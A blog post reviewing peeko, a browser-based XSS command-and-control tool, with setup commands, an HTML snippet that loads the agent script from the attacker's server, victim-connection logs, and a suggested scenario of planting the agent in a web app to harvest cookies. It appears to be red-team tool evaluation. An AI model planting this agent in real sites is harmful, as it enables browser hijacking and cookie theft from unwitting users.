---
layout: post
title:  "Testing peeko - Browser-based C2"
date:   2025-07-21 18:00:00 +0200
categories: tools c2
---

## 1. Introduction

The description of the [b3rito/peeko](https://github.com/b3rito/peeko) tool on its GitHub page reads: *Browser-based XSS C2 for stealthy internal network exploration via infected browser.* Words like "browser-based", "C2", and "stealthy" in one sentence sound promising, so let's see how it actually works.

I tested version 1.1 of the tool, using the latest GitHub commit from 14 April 2025.

## 2. How it works

This is how the tool can be used in an attack, step by step:

1. The **Attacker** installs and starts the **peeko** server.
2. The **Attacker** injects the [peeko/static/agent.js](https://github.com/b3rito/peeko/blob/main/static/agent.js) script into a web page.
3. The **Attacker** tricks a **Victim** into visiting the infected web page.

During step 3, the **Victim**'s browser connects to the **peeko** server using WebSockets. The **Attacker** can then use the **peeko Control Panel** to execute commands in the context of the **Victim**'s browser.

## 3. Testing

### 3.1 Installation

The installation went more or less as described in the [Quick Start](https://github.com/b3rito/peeko?tab=readme-ov-file#quick-start). The only missing step was activating Python's virtual environment and installing the prerequisites.

#### Install prerequisites (on Ubuntu 24.04)

```bash
sudo apt update
sudo apt install make -y
sudo apt install python3 python3-pip -y
sudo apt install python3.12-venv -y
sudo apt install uvicorn
```

#### Create and activate virtual environment

```bash
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

#### Install peeko

```bash
git clone https://github.com/b3rito/peeko.git && cd peeko
make install
chmod +x gen-cert.sh start.sh
make cert
```

#### Setup peeko

Replace the `SERVER-IP` placeholder with the actual server IP (`10.3.10.99` in my case) in the following files:

```bash
nano static/agent.js
nano static/control.html
```

#### Start peeko

```bash
make run
```

It's running!

```
./start.sh
INFO:     Started server process [52506]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on https://0.0.0.0:8443 (Press CTRL+C to quit)
```

### 3.2. Usage

#### 3.2.1 Opening Control Panel

I opened the **peeko Control Panel** on my host machine in Firefox:

```url
https://10.3.10.99:8443/static/control.html
```

I got a message that the site was not secure, but I could continue and got the Control Panel:

![peeko Control Panel](/assets/images/ControlPanel.jpeg)

I could also see some messages in the **peeko** server output:

```
INFO:     198.51.100.2:61900 - "GET /static/control.html HTTP/1.1" 200 OK
INFO:     198.51.100.2:61900 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     198.51.100.2:61905 - "WebSocket /ws" [accepted]
INFO:     connection open
[+] Attacker connected: 198.51.100.2
```

#### 3.2.2 Creating and opening infected page

The easiest way to simulate a **Victim** is to simply open the page `https://10.3.10.99:8443/static/infect.html` in a browser on the **Victim**'s machine.

Alternatively, you can create a simple HTML page and either host it on your web server or save it as `payload.html` in the **Victim**'s `Documents` folder:

```html
<html>
<body>
	<script src="https://10.3.10.99:8443/static/agent.js"></script>
	<h1>Hello victim!</h1>
</body>
</html>
```

> [!info]
> If you use this method, bear in mind that the **peeko** server uses a self-signed certificate, which isn't automatically trusted by the browser. As a result, the request to `https://10.3.10.99:8443/static/agent.js` will fail with an invalid SSL certificate error. The solution is to visit the **peeko** server from the **Victim**'s browser first and manually accept the certificate.

When you open the infected page, a new entry immediately appears in the **peeko Control Panel**, and you’ll also see the following entries in the **peeko** server logs:

```
INFO:     10.3.10.22:52008 - "GET /static/agent.js HTTP/1.1" 200 OK
INFO:     10.3.10.22:52010 - "WebSocket /ws" [accepted]
INFO:     connection open
[+] Victim connected: victim-1 (10.3.10.22)
```

Obviously, the connection lasts only as long as the user keeps the page open in their browser. Once they close it, the connection is lost:

```
[-] Victim disconnected: victim-1
INFO:     connection closed
```

#### 3.2.3 Testing peeko features

##### Custom JavaScript to Execute

I tried simple `alert('Hello victim!');` and it worked very well:

![Custom Javascript](/assets/images/JavascriptAlert.png)

Also server logged it:

```
[🚨 From victim-1] [✅ EXEC] Executed: alert('Hello victim!');...
```

##### Target URL

I tried to access the Control Panel using the URL `https://10.3.10.99:8443/static/control.html`, but it was blocked by the **Victim**'s browser with the following error in the browser console: `Access to fetch at 'https://10.3.10.99:8443/static/control.html' from origin 'null' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource`

Server log:

```
[🚨 From victim-1] [❌] Fetch error for https://10.3.10.99:8443/static/control.html: TypeError: Failed to fetch
```

##### Scan LAN Targets

This works a bit differently than you might expect. It's not an `nmap` or ping sweep type of scan. Instead, it tries to contact the selected IPs and ports using the HTTPS protocol. Here's an example of the output when I specified the IP range `10.3.10.10-12` and port `443`:

```
[🚨 From victim-1] [❌] Fetch error for https://10.3.10.10:443: TypeError: Failed to fetch
[🚨 From victim-1] [❌] Fetch error for https://10.3.10.11:443: TypeError: Failed to fetch
[🚨 From victim-1] [❌] Fetch error for https://10.3.10.12:443: TypeError: Failed to fetch
```


##### Collect Browser Information

It seemed to work well, but I didn’t have enough cookies or other sensitive data in the browser to properly test it.

```
[COLLECTED INFO]
{
  "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0",
  "platform": "Win32",
  "url": "file:///C:/Users/brandon.stark/Documents/payload.html",
  "referrer": "",
  "plugins": [
    "PDF Viewer",
    "Chrome PDF Viewer",
    "Chromium PDF Viewer",
    "Microsoft Edge PDF Viewer",
    "WebKit built-in PDF"
  ],
  "cookies": "",
  "localStorage": {},
  "sessionStorage": {}
}
```

Log on server:

```
[🚨 From victim-1] [COLLECTED INFO] {"useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0","platform":"Win32","url":"file:///C:/Users/brandon.stark/Documents/payload.html","referrer":"","plugins":["PDF Viewer","Chrome PDF Viewer","Chromium PDF Viewer","Microsoft Edge PDF Viewer","WebKit built-in PDF"],"cookies":"","localStorage":{},"sessionStorage":{}}
```

##### File Upload

Working well, the file was stored in the user's `Downloads` folder.

```
[🚨 From victim-1] [FILE RECEIVED] IMG_2457.png (157177 bytes)
```

## 4. Evaluation

### 4.1 Limitations

Unfortunately, there are quite a few limitations—not because of the tool itself, but due to how modern web technologies and browsers work.

* The **Target URL** feature works only for sites that explicitly set the `Access-Control-Allow-Origin: *` HTTP header.
* The **Scan LAN Targets** feature can scan only HTTPS services running on other machines.
* The **Collect Browser Information** feature shows only cookies for the infected site, and only those not marked as `HttpOnly`.

And a couple of reminders from Captain Obvious:

* WebSocket connections between the **Victim** and the **peeko** server must be allowed.
* When the user closes the infected page, the connection is lost.

### 4.2 Practical use cases

Sadly, due to all the limitations, I haven’t found many practical attacks where this tool could be effectively used.

The most promising scenario is when you gain write access to a folder containing a web application and want to collect sensitive cookies from that site. In such a case, you can copy the `agent.js` file into the folder with existing `.js` files and reference it on a page typically visited by logged-in users, such as the Dashboard or Settings. Then, simply check the **Auto collect on connect** box in the **peeko Control Panel** and monitor the server logs as users visit the infected page. Again, this only works for cookies not marked with the `HttpOnly` flag.

The **Target URL** feature could potentially be used like an SSRF to access external websites in the user's context. Unfortunately, there aren’t many valuable sites that explicitly set the `Access-Control-Allow-Origin: *` HTTP header.

Finally, the **Custom JavaScript to Execute** option, combined with **File Upload**, could probably be used in a more advanced phishing attack—but I haven't come up with a practical scenario for that yet.

## 5. Conclusion

I like the idea and the simplicity of the tool, but unfortunately, its limitations prevent it from making it into my Red Team tool belt.